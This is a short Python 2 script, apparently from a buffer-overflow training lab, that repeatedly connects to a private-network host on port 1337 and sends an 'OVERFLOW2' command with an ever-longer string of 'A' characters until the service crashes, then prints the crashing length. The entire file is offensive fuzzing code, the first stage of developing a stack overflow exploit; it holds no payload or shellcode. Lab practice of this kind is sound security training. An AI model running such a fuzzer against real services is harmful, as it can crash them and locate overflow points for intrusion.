#!/usr/bin/env python2
from __future__ import print_function
import sys, socket
from time import sleep

RHOST="192.168.180.140"
RPORT=1337

def connect(DATA):
        s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        connect=s.connect((RHOST, RPORT))
        s.send(("OVERFLOW2 " + DATA + "\r\n"))
        s.close()
        print ("Sent: {}".format(DATA))

buffer = "A" * 100

while True:
        try:
                connect(buffer)
                sleep(1)
                buffer = buffer + "A"*100

        except:
                print("Fuzzing crashed at %s bytes" % str(len(buffer)))
                exit()
